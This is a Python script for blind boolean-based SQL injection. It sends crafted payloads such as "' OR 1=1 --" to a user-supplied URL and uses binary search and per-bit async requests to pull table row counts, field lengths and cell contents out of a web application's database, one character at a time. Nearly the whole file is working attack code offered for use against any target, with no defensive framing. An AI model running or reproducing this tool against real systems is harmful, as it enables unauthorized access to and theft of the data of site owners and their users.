#!/usr/bin/env python

from bs4 import BeautifulSoup
# from threading import *
import asyncio, aiohttp
import requests

from ast import literal_eval
import configparser

from time import time

'''
            READING CONFIG
'''

def read_config(key, message, config):
    if config["Default"].get(key):
        return config["Default"].get(key)
    return input(message)

'''
            SQL PARSER
'''

def binary_search(query, x, xmin, s, url, cookies, res_true):
    xmax = x
    while True:
        if parse_with_query(query.format(x), s, url, cookies, res_true):
            xmax = min(xmax, x)
        else:
            if xmax - xmin == 1:
                return xmin
            xmin = max(xmin, x)
        x = xmin + (xmax - xmin) // 2

def parse_with_query(query, s, url, cookies, res_expected):
    try:
        page = s.get(url+query, cookies=cookies)
    # check domain accessibility
    except Exception as e:
        print('Connection error:', e)
        exit()
    if page.status_code != 200:
        print('Connection error:', page.status_code)
        exit()
    soup = BeautifulSoup(page.text, "lxml")
    return soup.findAll(string=res_expected)

async def async_parse_with_query(query, url, cookies, res_expected, cell_bin, i, pow_2):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url+query) as resp:
            html = await resp.text()
            soup = BeautifulSoup(html, "lxml")
    if soup.findAll(string=res_expected):
        cell_bin[i][pow_2] = "1"
    return

def parser(s, url, res_true, res_false, cookies, table_name, col_name):
    rows_amount = 200
    approx_rows_amount = True

    # primary check for injections accessibility
    res_when_true  = parse_with_query("' OR 1=1 --", s, url, cookies, res_true)
    res_when_false = parse_with_query("' OR 1=2 --", s, url, cookies, res_true)
    print("200 OK\n"+("Looks like \"' OR 1=1 --\" works" if res_when_true and \
    (res_when_true != res_when_false) else "\"' OR 1=1 --\" doesn't work"))

    if not table_name:
        print("Specify the table name to continue")
        return

    # find out the rows number
    query_for_rows_num = "' OR (SELECT count(*) FROM "+table_name+") --"
    if parse_with_query(query_for_rows_num, s, url, cookies, res_true):
        print("Looks like \""+query_for_rows_num+"\" works")
        query_for_rows_num = "' OR (SELECT count(*) %s {} FROM "+table_name+") --"
        rows_amount = binary_search(query_for_rows_num % "<", 60000, 1, s, url, cookies, res_true,)
        # additionally checking for result correctness
        if parse_with_query(query_for_rows_num.format(str(rows_amount)) % "=", s, url, cookies, res_true):
            print("\""+table_name+"\" table contents "+str(rows_amount)+" rows")
        else:
            print("\""+table_name+"\" table contents about "+str(rows_amount)+\
            " rows. Please, make issue on github repo with your case")
        approx_rows_amount = False
    else:
        print("\""+query_for_rows_num+"\" doesn't works")

    if not col_name:
        print("Specify the column name to continue")
        return

    for row_num in [str(row_int) for row_int in range(rows_amount)]:
        row_cout = str(int(row_num)+1)

        # find out the length of the cell value
        query_for_rows_length = "' OR (SELECT length("+col_name+") FROM "+table_name+" LIMIT "+row_num+",1) --"
        if parse_with_query(query_for_rows_length, s, url, cookies, res_true):
            print("Looks like \""+query_for_rows_length+"\" works") if row_num == '0' else None
            query_for_rows_length = "' OR (SELECT length("+col_name+") %s {} FROM "+table_name+" LIMIT "+row_num+",1) --"
            row_len = binary_search(query_for_rows_length % "<", 150, 1, s, url, cookies, res_true,)
            # additionally checking for result correctness
            if parse_with_query(query_for_rows_length.format(str(row_len)) % "=", s, url, cookies, res_true):
                print(row_cout+" row of the \""+col_name+"\" column of the \""+\
                      table_name+"\" table have "+str(row_len)+" symbols")
            else:
                print(row_cout+" row of the \""+col_name+"\" column of the \""+\
                      table_name+"\" table have about "+str(row_len)+" symbols. \
                      Please, make issue on github repo with your case")

        # find out the cell values with query like "' or (SELECT unicode(substr(name,1,1)) FROM sqlite_master LIMIT 0,1) > 0 --"
        query_for_rows = "' OR (SELECT unicode(substr("+col_name+",1,1)) FROM "+table_name+" LIMIT "+row_num+",1) > 0 --"
        if parse_with_query(query_for_rows, s, url, cookies, res_true):
            print("Looks like \""+query_for_rows+"\" works") if row_num == '0' else None
            cell_bin = []
            [cell_bin.append({1:"0",2:"0",4:"0",8:"0",16:"0",32:"0",64:"0"}) for _ in range(row_len)]

            for i in range(row_len): # character index
                ioloop = asyncio.new_event_loop()
                ch_binary = ""
                tasks = []
                for pow_2 in (1,2,4,8,16,32,64): # powers of two for each bit
                    query_for_rows = "' OR (SELECT unicode(substr("+col_name+","+str(i+1)+",1)) %26 "+str(pow_2)+" FROM "+table_name+" LIMIT "+row_num+", 1) --"
                    tasks.append(ioloop.create_task(async_parse_with_query(query_for_rows, url, cookies, res_true, cell_bin, i, pow_2)))

                wait_tasks = asyncio.wait(tasks)
                try:
                    ioloop.run_until_complete(wait_tasks)
                finally:
                    ioloop.stop()

                # convert bites dictionary to characters
                cell_value = ""
                for i in range(row_len):
                    cell_value = cell_value + chr(int("".join(cell_bin[i].values())[::-1], 2))
            print(row_cout+" row of the \""+col_name+"\" column of the \""+\
                  table_name+"\" table is: "+"".join(cell_value))
    print("All rows of the \""+table_name+"\" table have been parsed") \
    if approx_rows_amount == False else \
    print("First "+rows_amount+" rows of the \""+table_name+"\" table have been parsed")

'''
            MAIN FUNCTION
'''

def main():
    s = requests.Session()

    # read config data or get it from input
    config = configparser.ConfigParser()
    config.read("config")

    url         = read_config('url', "Input target URL: ", config)
    res_true    = read_config('res_true', "Response on True queries: ", config)
    res_false   = read_config('res_false', "Response on False queries: ", config)
    table_name  = read_config('table_name', "Input name of the table you know (if so): ", config)
    col_name    = read_config('col_name', "Input name of the column you know (if so): ", config)
    cookies     = dict(literal_eval(config["Default"].get("cookies"))) \
                  if config["Default"].get("cookies") \
                  else dict(input("Set cookie #"+str(i)+": ").split() \
                  for i in range(int(input("Some cookies? (enter quantity or 0) "))))

    # parse responses
    parser(s, url, res_true, res_false, cookies, table_name, col_name)

if __name__ == '__main__':
    try:
        t0 = time()
        main()
    except KeyboardInterrupt as e:
        print(e)
    finally:
        print(time() - t0, '\n')
